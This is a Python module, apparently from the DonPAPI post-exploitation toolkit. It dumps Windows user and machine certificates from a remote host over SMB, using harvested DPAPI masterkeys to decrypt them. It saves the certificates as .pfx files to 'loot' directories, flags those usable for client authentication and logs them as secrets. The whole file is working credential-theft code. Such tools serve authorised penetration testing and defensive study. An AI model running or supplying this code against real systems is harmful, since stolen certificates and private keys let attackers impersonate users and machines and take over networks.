from os import path
from typing import Any
from dploot.lib.target import Target
from dploot.lib.smb import DPLootSMBConnection
from dploot.triage.certificates import CertificatesTriage
from donpapi.core import DonPAPICore
from donpapi.lib.logger import DonPAPIAdapter
from donpapi.lib.utils import dump_file_to_loot_directories


class Certificates:
    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: list, options: Any, logger: DonPAPIAdapter, context: DonPAPICore, false_positive: list, max_filesize: int) -> None:
        self.tag = self.__class__.__name__
        self.target = target
        self.conn = conn
        self.masterkeys = masterkeys
        self.options = options
        self.logger = logger
        self.context = context
        self.false_positive = false_positive
        self.max_filesize = max_filesize

    def run(self) -> None:
        self.logger.display(f"Dumping User{' and Machine' if self.context.remoteops_allowed else ''} Certificates")

        def certificate_callback(certificate):
            cert_username = certificate.username.rstrip("\x00")
            filename = f"{cert_username}_{certificate.filename[:16]}.pfx"
            self.print_and_store(certificate, cert_username, filename)

        certificates_triage = CertificatesTriage(target=self.target, conn=self.conn, masterkeys=self.masterkeys, per_certificate_callback=certificate_callback,)
        certificates_triage.triage_certificates()
        if self.context.remoteops_allowed:
            certificates_triage.triage_system_certificates()
            
    
    def print_and_store(self, certificate, cert_username, filename) -> None:
        absolute_local_filepath = path.join(self.context.target_output_dir, filename)
        dump_file_to_loot_directories(absolute_local_filepath, certificate.pfx)
        collector_dir_local_filepath = path.join(self.context.global_output_dir, self.tag, filename)
        dump_file_to_loot_directories(collector_dir_local_filepath, certificate.pfx)
        self.logger.secret(f"[{certificate.winuser}] - {cert_username} - {filename}{' - Client auth possible' if certificate.clientauth else ''}", self.tag)
        self.context.db.add_certificate(absolute_local_filepath, certificate, self.context.host)
